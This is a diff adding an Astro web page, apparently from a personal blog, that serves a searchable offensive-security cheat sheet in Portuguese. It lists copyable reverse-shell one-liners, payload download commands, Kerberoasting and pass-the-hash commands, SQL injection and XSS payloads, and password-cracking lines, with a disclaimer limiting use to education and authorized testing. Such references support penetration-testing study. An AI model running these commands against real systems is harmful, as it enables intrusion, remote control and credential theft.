@@ -1,0 +1,327 @@
+---
+import MainGridLayout from "../layouts/MainGridLayout.astro";
+
+const categories = [
+  {
+    name: "Reverse Shells",
+    id: "shells",
+    icon: "material-symbols:terminal-rounded",
+    commands: [
+      { cmd: "bash -i >& /dev/tcp/10.0.0.1/4242 0>&1", desc: "Bash TCP Reverse Shell", difficulty: "Easy", tags: ["linux", "bash", "network"] },
+      { cmd: "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'", desc: "Python3 Reverse Shell", difficulty: "Medium", tags: ["scripting", "python", "linux"] },
+      { cmd: "nc -e /bin/sh 10.0.0.1 4242", desc: "Netcat Traditional", difficulty: "Easy", tags: ["netcat", "linux", "backdoor"] },
+      { cmd: "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f", desc: "Netcat OpenBSD (No -e)", difficulty: "Medium", tags: ["netcat", "fifo", "linux"] },
+      { cmd: "php -r '$sock=fsockopen(\"10.0.0.1\",4242);exec(\"/bin/sh -i <&3 >&3 2>&3\");'", desc: "PHP Reverse Shell", difficulty: "Medium", tags: ["web", "php"] }
+    ]
+  },
+  {
+    name: "TTY Upgrade",
+    id: "tty",
+    icon: "material-symbols:keyboard-command-key-rounded",
+    commands: [
+      { cmd: "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'", desc: "Python PTY Spawn", difficulty: "Easy", tags: ["post-exploit", "python", "shell"] },
+      { cmd: "export TERM=xterm", desc: "Set xterm", difficulty: "Easy", tags: ["env"] },
+      { cmd: "stty raw -echo; fg", desc: "STTY Raw Mode (After Ctrl+Z)", difficulty: "Medium", tags: ["interactive", "terminal"] }
+    ]
+  },
+  {
+    name: "File Transfer",
+    id: "transfer",
+    icon: "material-symbols:cloud-download-rounded",
+    commands: [
+      { cmd: "python3 -m http.server 8000", desc: "Attack Box Server", difficulty: "Easy", tags: ["python", "server", "http"] },
+      { cmd: "wget http://10.0.0.1:8000/file.exe -O file.exe", desc: "Linux Wget", difficulty: "Easy", tags: ["linux", "download"] },
+      { cmd: "curl http://10.0.0.1:8000/file.exe -o file.exe", desc: "Linux Curl", difficulty: "Easy", tags: ["linux", "curl"] },
+      { cmd: "iwr -uri http://10.0.0.1:8000/file.exe -OutFile file.exe", desc: "Windows PowerShell", difficulty: "Easy", tags: ["windows", "powershell"] },
+      { cmd: "certutil -urlcache -f http://10.0.0.1:8000/file.exe file.exe", desc: "Windows Certutil", difficulty: "Medium", tags: ["windows", "bypass"] }
+    ]
+  },
+  {
+    name: "Network & SMB",
+    id: "network",
+    icon: "material-symbols:router-rounded",
+    commands: [
+      { cmd: "nmap -sC -sV -p- -T4 10.10.x.x", desc: "Nmap Full Scan", difficulty: "Easy", tags: ["recon", "nmap"] },
+      { cmd: "smbclient -L //10.10.x.x/", desc: "List SMB Shares", difficulty: "Easy", tags: ["smb", "recon"] },
+      { cmd: "enum4linux -a 10.10.x.x", desc: "Enum4Linux All", difficulty: "Medium", tags: ["smb", "enumeration"] }
+    ]
+  },
+  {
+    name: "Active Directory",
+    id: "ad",
+    icon: "material-symbols:hub-rounded",
+    commands: [
+      { cmd: "impacket-GetNPUsers domain.local/ -usersfile users.txt -format john -dc-ip 10.10.x.x", desc: "AS-REP Roasting", difficulty: "Medium", tags: ["ad", "kerberos", "impacket"] },
+      { cmd: "impacket-GetUserSPNs domain.local/user:pass -dc-ip 10.10.x.x -request", desc: "Kerberoasting", difficulty: "Hard", tags: ["ad", "kerberos", "impacket"] }
+    ]
+  },
+  {
+    name: "Lateral Movement",
+    id: "lateral",
+    icon: "material-symbols:directions-run-rounded",
+    commands: [
+      { cmd: "evil-winrm -i 10.10.x.x -u user -H hash", desc: "Pass-The-Hash WinRM", difficulty: "Medium", tags: ["winrm", "powershell", "hash"] },
+      { cmd: "impacket-psexec administrator@10.10.x.x -hashes :hash", desc: "Impacket PsExec Hash", difficulty: "Hard", tags: ["impacket", "windows", "psexec"] }
+    ]
+  },
+  {
+    name: "Web Exploitation",
+    id: "web",
+    icon: "material-symbols:language-rounded",
+    commands: [
+      { cmd: "' OR 1=1 --", desc: "SQLi Auth Bypass", difficulty: "Easy", tags: ["sqli", "auth"] },
+      { cmd: "UNION SELECT 1,2,3,database(),user()--", desc: "SQLi Union Enumeration", difficulty: "Medium", tags: ["sqli", "recon"] },
+      { cmd: "<script>alert('XSS')</script>", desc: "Basic XSS Payload", difficulty: "Easy", tags: ["xss", "client-side"] }
+    ]
+  },
+  {
+    name: "Password Cracking",
+    id: "cracking",
+    icon: "material-symbols:lock-open-rounded",
+    commands: [
+      { cmd: "ssh2john id_rsa > hash.txt; john --wordlist=rockyou.txt hash.txt", desc: "SSH Key Cracking", difficulty: "Easy", tags: ["john", "ssh", "passwords"] },
+      { cmd: "hashcat -m 22900 hash.txt rockyou.txt", desc: "Hashcat SSH Hash", difficulty: "Medium", tags: ["hashcat", "gpu", "passwords"] }
+    ]
+  },
+  {
+    name: "Exploit Dev",
+    id: "exploit",
+    icon: "material-symbols:bug-report-rounded",
+    commands: [
+      { cmd: "msf-pattern_create -l 500", desc: "Metasploit Pattern Create", difficulty: "Medium", tags: ["bof", "patterns"] },
+      { cmd: "msf-pattern_offset -q <address>", desc: "Metasploit Pattern Offset", difficulty: "Hard", tags: ["bof", "debugging"] }
+    ]
+  }
+];
+
+const allDifficulties = ["Easy", "Medium", "Hard"];
+const allCommandFlat = categories.flatMap(cat => cat.commands.map(cmd => ({ ...cmd, category: cat.name })));
+---
+<MainGridLayout title="CheatSheet" description="SecOps Manual & Offensive Snippets">
+    <div class="flex flex-col gap-8 w-full pb-20 onload-animation">
+        <!-- Header Section -->
+        <div class="card-base p-5 sm:p-8 border-b-4 border-[var(--primary)]/20 relative overflow-hidden">
+            <h1 class="text-2xl sm:text-4xl font-black text-black/90 dark:text-white/90 mb-2 uppercase tracking-tighter">
+                🔐 SECOPS <span class="text-[var(--primary)]">DASHBOARD</span>
+            </h1>
+            <p class="text-black/60 dark:text-white/60 font-mono text-xs sm:text-sm uppercase tracking-widest">
+                Interface tática para busca de comandos e técnicas ofensivas.
+            </p>
+        </div>
+
+        <!-- Filter Dashboard -->
+        <div class="card-base p-6 border-b-2 border-[var(--primary)]/10 space-y-6" id="filter-dashboard">
+            <!-- Search Bar -->
+            <div class="relative group">
+                <div class="absolute inset-y-0 left-4 flex items-center pointer-events-none text-black/20 dark:text-white/20 group-focus-within:text-[var(--primary)] transition-colors">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line></svg>
+                </div>
+                <input 
+                    type="text" 
+                    id="command-search"
+                    placeholder="Buscar por comando ou técnica..."
+                    class="w-full bg-black/5 dark:bg-white/5 border border-black/10 dark:border-white/10 rounded-xl py-3 pl-12 pr-4 text-sm focus:outline-none focus:border-[var(--primary)]/50 focus:ring-1 focus:ring-[var(--primary)]/20 transition-all font-mono"
+                />
+            </div>
+
+            <!-- Filter Groups -->
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
+                <!-- Categories -->
+                <div class="space-y-2">
+                    <span class="text-[10px] uppercase font-bold tracking-widest text-black/40 dark:text-white/40 block">Categorias</span>
+                    <div class="flex flex-wrap gap-1.5" id="category-filters">
+                        {categories.map(cat => (
+                            <button 
+                                data-category={cat.name}
+                                class="filter-btn px-2.5 py-1 rounded-lg text-[10px] font-bold border transition-all bg-black/5 dark:bg-white/5 text-black/40 dark:text-white/40 border-transparent hover:border-black/10 dark:hover:border-white/10"
+                            >
+                                {cat.name}
+                            </button>
+                        ))}
+                    </div>
+                </div>
+
+                <!-- Difficulty -->
+                <div class="space-y-2">
+                    <span class="text-[10px] uppercase font-bold tracking-widest text-black/40 dark:text-white/40 block">Dificuldade</span>
+                    <div class="flex flex-wrap gap-1.5" id="difficulty-filters">
+                        {allDifficulties.map(diff => (
+                            <button 
+                                data-difficulty={diff}
+                                class="filter-btn px-2.5 py-1 rounded-lg text-[10px] font-bold border transition-all bg-black/5 dark:bg-white/5 text-black/40 dark:text-white/40 border-transparent hover:border-black/10 dark:hover:border-white/10"
+                            >
+                                {diff}
+                            </button>
+                        ))}
+                    </div>
+                </div>
+            </div>
+
+            <!-- Status Bar -->
+            <div class="flex flex-wrap items-center justify-between gap-2 pt-4 border-t border-black/5 dark:border-white/5 text-[10px] font-mono uppercase tracking-widest text-black/30 dark:text-white/30">
+                <span id="results-count">Mostrando {allCommandFlat.length} resultado(s)</span>
+                <button id="reset-filters" class="hover:text-[var(--primary)] transition-colors py-1 px-2 rounded border border-current">Limpar Filtros</button>
+            </div>
+        </div>
+
+        <!-- Results Grid -->
+        <div class="grid grid-cols-1 md:grid-cols-2 gap-4 pb-12" id="commands-grid">
+            {allCommandFlat.map(cmd => (
+                <div 
+                    class="command-card group flex flex-col p-5 bg-zinc-900/40 backdrop-blur-sm border border-white/5 rounded-2xl hover:border-[var(--primary)]/30 transition-all hover:bg-zinc-900/60 shadow-sm overflow-hidden"
+                    data-category={cmd.category}
+                    data-difficulty={cmd.difficulty}
+                    data-search={`${cmd.cmd} ${cmd.desc} ${cmd.category}`.toLowerCase()}
+                >
+                    <div class="flex justify-between items-start mb-3">
+                        <div class="flex items-center gap-2">
+                             <span class="text-[9px] uppercase font-black text-[var(--primary)] px-1.5 py-0.5 rounded bg-[var(--primary)]/10 border border-[var(--primary)]/20">{cmd.category}</span>
+                             <span class={`text-[9px] uppercase font-black px-1.5 py-0.5 rounded border ${cmd.difficulty === 'Easy' ? 'text-green-400 border-green-500/20 bg-green-500/5' : cmd.difficulty === 'Medium' ? 'text-yellow-400 border-yellow-500/20 bg-yellow-500/5' : 'text-red-400 border-red-500/20 bg-red-500/5'}`}>{cmd.difficulty}</span>
+                        </div>
+                        <button 
+                            class="copy-btn p-2 rounded-lg bg-white/5 hover:bg-[var(--primary)]/10 transition-colors text-white/20 hover:text-[var(--primary)]"
+                            data-command={cmd.cmd}
+                            title="Copiar Comando"
+                        >
+                            <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
+                        </button>
+                    </div>
+
+                    <h4 class="text-sm font-bold text-white/90 mb-1 group-hover:text-[var(--primary)] transition-colors">{cmd.desc}</h4>
+                    
+                    <div class="mt-4 p-3 bg-black/60 rounded-xl border border-white/5 font-mono text-[10px] sm:text-xs text-blue-100/80 overflow-x-auto custom-scrollbar leading-relaxed whitespace-nowrap">
+                        <span class="text-[var(--primary)] select-none">felps@offsec:~$</span> {cmd.cmd}
+                    </div>
+
+                    <div class="mt-4 flex flex-wrap gap-1.5">
+                        {cmd.tags.map(tag => (
+                            <span
+                                class="text-[9px] font-mono font-bold uppercase tracking-wider px-1.5 py-0.5 rounded border"
+                                style="color: var(--primary); background: rgba(0,0,0,0.3); border-color: var(--primary); opacity: 0.75;"
+                            >#{tag}</span>
+                        ))}
+                    </div>
+                </div>
+            ))}
+        </div>
+
+        <!-- Footer Note -->
+        <div class="p-6 rounded-2xl bg-red-500/5 border border-red-500/20 text-red-400 font-mono text-xs flex items-center gap-4">
+            <span class="p-2 rounded-lg bg-red-500/10">⚠️</span>
+            ADVERTÊNCIA: ESTE MATERIAL É PARA FINS EDUCACIONAIS E TESTES AUTORIZADOS. O USO INDEVIDO É ILEGAL.
+        </div>
+    </div>
+</MainGridLayout>
+
+<script>
+    function setupDashboard() {
+        const searchInput = document.getElementById('command-search');
+        const cards = document.querySelectorAll('.command-card');
+        const filterBtns = document.querySelectorAll('.filter-btn');
+        const resultsCount = document.getElementById('results-count');
+        const resetBtn = document.getElementById('reset-filters');
+        const copyBtns = document.querySelectorAll('.copy-btn');
+
+        let activeCategories = new Set();
+        let activeDifficulties = new Set();
+        let searchQuery = "";
+
+        function updateFilters() {
+            let visibleCount = 0;
+            cards.forEach(card => {
+                const category = card.dataset.category;
+                const difficulty = card.dataset.difficulty;
+                const searchContent = card.dataset.search;
+
+                const matchesSearch = !searchQuery || searchContent.includes(searchQuery.toLowerCase());
+                const matchesCategory = activeCategories.size === 0 || activeCategories.has(category);
+                const matchesDifficulty = activeDifficulties.size === 0 || activeDifficulties.has(difficulty);
+
+                if (matchesSearch && matchesCategory && matchesDifficulty) {
+                    card.style.display = 'flex';
+                    visibleCount++;
+                } else {
+                    card.style.display = 'none';
+                }
+            });
+            resultsCount.textContent = `Mostrando ${visibleCount} resultado(s)`;
+        }
+
+        searchInput?.addEventListener('input', (e) => {
+            searchQuery = e.target.value;
+            updateFilters();
+        });
+
+        filterBtns.forEach(btn => {
+            btn.addEventListener('click', () => {
+                const category = btn.dataset.category;
+                const difficulty = btn.dataset.difficulty;
+
+                if (category) {
+                    if (activeCategories.has(category)) activeCategories.delete(category);
+                    else activeCategories.add(category);
+                }
+                if (difficulty) {
+                    if (activeDifficulties.has(difficulty)) activeDifficulties.delete(difficulty);
+                    else activeDifficulties.add(difficulty);
+                }
+
+                btn.classList.toggle('active-filter');
+                updateFilters();
+            });
+        });
+
+        resetBtn?.addEventListener('click', () => {
+            activeCategories.clear();
+            activeDifficulties.clear();
+            searchQuery = "";
+            searchInput.value = "";
+            filterBtns.forEach(btn => btn.classList.remove('active-filter'));
+            updateFilters();
+        });
+
+        copyBtns.forEach(btn => {
+            btn.addEventListener('click', async () => {
+                const cmd = btn.dataset.command;
+                try {
+                    await navigator.clipboard.writeText(cmd);
+                    const originalHTML = btn.innerHTML;
+                    btn.innerHTML = `<svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="text-green-400"><polyline points="20 6 9 17 4 12"></polyline></svg>`;
+                    setTimeout(() => {
+                        btn.innerHTML = originalHTML;
+                    }, 2000);
+                } catch (err) {
+                    console.error('Failed to copy text: ', err);
+                }
+            });
+        });
+    }
+
+    // Run on visit and on swup transitions
+    setupDashboard();
+    document.addEventListener('swup:content:replace', setupDashboard);
+</script>
+
+<style>
+    .active-filter {
+        background-color: rgba(var(--primary-rgb, 0,255,127), 0.12) !important;
+        color: var(--primary) !important;
+        border-color: var(--primary) !important;
+        box-shadow: 0 0 8px -2px var(--primary);
+    }
+
+    .custom-scrollbar::-webkit-scrollbar {
+        height: 4px;
+        width: 4px;
+    }
+    .custom-scrollbar::-webkit-scrollbar-track {
+        background: transparent;
+    }
+    .custom-scrollbar::-webkit-scrollbar-thumb {
+        background: rgba(255, 255, 255, 0.1);
+        border-radius: 10px;
+    }
+    .custom-scrollbar::-webkit-scrollbar-thumb:hover {
+        background: var(--primary);
+    }
+</style>
